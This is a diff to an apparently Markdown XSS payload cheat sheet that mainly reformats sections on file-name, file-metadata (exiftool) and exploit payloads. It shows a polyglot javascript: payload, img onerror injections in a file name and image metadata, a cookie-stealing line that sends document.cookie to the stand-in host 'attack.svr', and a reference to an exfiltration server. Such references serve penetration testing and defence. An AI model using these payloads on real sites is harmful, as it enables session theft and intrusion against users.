@@ -159,7 +159,9 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 #### File Name
 
-`""><img src=x onerror=alert(1)>.gif`
+```
+""><img src=x onerror=alert(1)>.gif
+```
 
 #### SVG 
 
@@ -177,11 +179,15 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 #### File Metadata
 
-+ Note: These can be embeded with exiftool and hence include the command for each 
+*These can be embeded with exiftool and hence an example command for doing so is included.*
 
-`“><img src=1 onerror=alert(alert(1))>’ payload_file.jpeg`
+```
+“><img src=1 onerror=alert(alert(1))>’ payload_file.jpeg
+```
 
-+ `$ exiftool -Artist='PAYLOAD'`
+**Usage**
+
+`$ exiftool -Artist='PAYLOAD'`
 
 #### GIF
 
@@ -190,7 +196,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 ## Exploit Payloads
 
-+ Malicious js code for exploit payloads
+JS code for embedding in exploit payloads.
 
 ### Phishing Redirect
 ```
@@ -238,7 +244,7 @@ document.write(<img src="http://attack.svr?cookie=" + document.cookie>);
 
 ### Grab Protected Pages
 
-~ Requires attack server ~
+*For use with an [exfiltration/attack server](#exfiltration-servers)*
 
 ```
 fetch('/protected_page')
